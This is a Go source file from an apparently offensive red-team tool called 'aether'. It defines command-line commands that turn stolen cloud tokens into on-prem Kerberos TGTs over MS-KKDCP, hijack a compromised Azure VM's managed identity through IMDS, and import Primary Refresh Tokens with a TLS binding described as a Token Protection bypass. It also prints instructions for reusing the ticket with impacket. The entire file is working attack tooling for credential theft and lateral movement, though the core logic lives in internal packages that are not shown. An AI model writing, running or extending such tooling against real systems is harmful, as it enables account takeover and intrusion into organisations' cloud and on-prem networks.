package cli

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/spf13/cobra"

	"github.com/Debajyoti0-0/aether/internal/engine/exec"
	"github.com/Debajyoti0-0/aether/internal/engine/pivot"
	"github.com/Debajyoti0-0/aether/internal/engine/token"
	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
	"github.com/Debajyoti0-0/aether/internal/workspace"
)

var pivotCmd = &cobra.Command{
	Use:   "pivot",
	Short: "Cross-boundary pivoting operations",
	Long:  "Pivot between cloud and on-prem: extract Kerberos TGTs from cloud tokens (replaces Mimikatz for hybrid).",
}

var pivotCloudOnPremCmd = &cobra.Command{
	Use:   "cloud-to-onprem",
	Short: "Extract a Kerberos TGT from a cloud token via MS-KKDCP",
	RunE:  runPivotCloudOnPrem,
}

var pivotIMDSCmd = &cobra.Command{
	Use:   "imds",
	Short: "Hijack the managed identity of a compromised Azure VM via IMDS",
	RunE:  runPivotIMDS,
}

var (
	pivotToken     string
	pivotDomain    string
	pivotUser      string
	pivotKKDCP     string
	pivotOut       string
	pivotWorkspace string
	pivotClientID  string
	pivotObjectID  string
	pivotResource  string
	pivotTimeout   int
)

func init() {
	rootCmd.AddCommand(pivotCmd)
	pivotCmd.AddCommand(pivotCloudOnPremCmd, pivotIMDSCmd)

	pivotCloudOnPremCmd.Flags().StringVar(&pivotToken, "token", "", "Cloud token / PRT binding used as pre-auth (required)")
	pivotCloudOnPremCmd.Flags().StringVar(&pivotDomain, "domain", "", "On-prem realm, e.g. INTERNAL.LOCAL (required)")
	pivotCloudOnPremCmd.Flags().StringVar(&pivotUser, "user", "", "Username without realm (required)")
	pivotCloudOnPremCmd.Flags().StringVar(&pivotKKDCP, "kkdcp", "https://login.microsoftonline.com/common/Kerberos/api", "MS-KKDCP endpoint")
	pivotCloudOnPremCmd.Flags().StringVar(&pivotOut, "out", "aether.ccache", "Output ccache path")
	pivotCloudOnPremCmd.Flags().StringVar(&pivotWorkspace, "workspace", "", "Store result in workspace")
	pivotCloudOnPremCmd.Flags().IntVar(&pivotTimeout, "timeout", 60, "Timeout seconds")
	_ = pivotCloudOnPremCmd.MarkFlagRequired("token")
	_ = pivotCloudOnPremCmd.MarkFlagRequired("domain")
	_ = pivotCloudOnPremCmd.MarkFlagRequired("user")

	pivotIMDSCmd.Flags().StringVar(&pivotResource, "resource", "https://management.azure.com/", "Resource to request")
	pivotIMDSCmd.Flags().StringVar(&pivotClientID, "client-id", "", "Pin user-assigned identity by client id")
	pivotIMDSCmd.Flags().StringVar(&pivotObjectID, "object-id", "", "Pin user-assigned identity by object id")
	pivotIMDSCmd.Flags().StringVar(&pivotOut, "out", "", "Save token JSON to file")
	pivotIMDSCmd.Flags().IntVar(&pivotTimeout, "timeout", 30, "Timeout seconds")
}

func runPivotCloudOnPrem(cmd *cobra.Command, args []string) error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(pivotTimeout)*time.Second)
	defer cancel()

	kkdc := pivot.NewKKDCPClient(pivotKKDCP, pivotDomain, nil)
	result, err := pivot.ExtractCloudTGT(ctx, kkdc, pivot.ASREQOptions{
		Realm:      pivotDomain,
		ClientName: pivotUser,
		Token:      pivotToken,
	}, pivotUser, pivotOut)
	if err != nil {
		return err
	}

	fmt.Printf("TGT extracted → %s\nRealm: %s\nTicket: %d bytes (%s)\n\nSet KRB5CCNAME and use impacket over Kerberos:\n  export KRB5CCNAME=%s\n",
		result.CcachePath, result.Realm, result.TicketSize, result.Prefix, result.CcachePath)

	if pivotWorkspace != "" && workspace.Exists(pivotWorkspace) {
		if w, err := workspace.Open(pivotWorkspace, os.Getenv("AETHER_PASSPHRASE")); err == nil {
			_ = w.LogEvent("tgt_extracted", fmt.Sprintf("realm=%s size=%d path=%s", result.Realm, result.TicketSize, result.CcachePath))
		}
	}
	return nil
}

func runPivotIMDS(cmd *cobra.Command, args []string) error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(pivotTimeout)*time.Second)
	defer cancel()

	client := exec.NewIMDSClient(nil)

	// Try IMDSv2 first, fall back to v1.
	if err := client.FetchToken(ctx, 300); err == nil {
		fmt.Fprintln(os.Stderr, "IMDSv2 session token acquired")
	} else {
		fmt.Fprintln(os.Stderr, "IMDSv2 unavailable, falling back to v1")
	}

	if meta, err := client.InstanceMetadata(ctx); err == nil {
		if name, ok := meta["name"].(string); ok {
			fmt.Fprintf(os.Stderr, "Target VM: %s\n", name)
		}
	}

	tokens, err := client.GetIdentityToken(ctx, pivotResource, pivotClientID, pivotObjectID)
	if err != nil {
		return err
	}

	if pivotOut != "" {
		data, _ := json.MarshalIndent(tokens, "", "  ")
		if err := os.WriteFile(pivotOut, data, 0o600); err != nil {
			return err
		}
		fmt.Fprintf(os.Stderr, "Token saved to %s\n", pivotOut)
	}

	// Never print the raw token to stdout by default; show metadata only.
	fmt.Printf("Managed identity token acquired: %d bytes, expires in %ds\n",
		len(tokens.AccessToken), tokens.ExpiresIn)
	return nil
}

// prtImportCmd implements `aether prt import` (kill-chain Phase 1).
var prtImportCmd = &cobra.Command{
	Use:   "import",
	Short: "Import a PRT (and optional TLS binding) into a workspace",
	RunE: func(cmd *cobra.Command, args []string) error {
		if prtImpFile == "" {
			return fmt.Errorf("--prt is required")
		}
		if prtImpWorkspace == "" {
			return fmt.Errorf("--workspace is required")
		}

		data, err := os.ReadFile(prtImpFile)
		if err != nil {
			return fmt.Errorf("read prt file: %w", err)
		}
		prt, err := token.ParsePRT(data)
		if err != nil {
			return err
		}

		w, err := workspace.Open(prtImpWorkspace, os.Getenv("AETHER_PASSPHRASE"))
		if err != nil {
			return err
		}
		if err := w.SaveRecord(workspace.BucketTokens, "prt", prt); err != nil {
			return err
		}
		_ = w.LogEvent("prt_imported", fmt.Sprintf("tenant=%s user=%s", prt.TenantID, prt.UserID))

		// Optional TLS binding for Token Protection bypass.
		if prtImpBinding != "" {
			bindData, err := os.ReadFile(prtImpBinding)
			if err == nil {
				if _, err := msoapx.LoadChannelBinding(string(bindData)); err != nil {
					return fmt.Errorf("invalid tls binding: %w", err)
				}
				if err := w.SaveRecord(workspace.BucketTokens, "tls_binding", map[string]string{
					"binding": base64.StdEncoding.EncodeToString([]byte(bindData)),
				}); err != nil {
					return err
				}
				_ = w.LogEvent("tls_binding_imported", prtImpBinding)
			}
		}

		fmt.Printf("PRT imported into workspace %q\n", prtImpWorkspace)
		return nil
	},
}

var (
	prtImpFile      string
	prtImpBinding   string
	prtImpWorkspace string
)

func init() {
	prtCmd.AddCommand(prtImportCmd)
	prtImportCmd.Flags().StringVar(&prtImpFile, "prt", "", "PRT JSON/bin file (required)")
	prtImportCmd.Flags().StringVar(&prtImpBinding, "tls-binding", "", "TLS binding dump file (Token Protection bypass)")
	prtImportCmd.Flags().StringVar(&prtImpWorkspace, "workspace", "", "Target workspace (required)")
	_ = prtImportCmd.MarkFlagRequired("workspace")
}
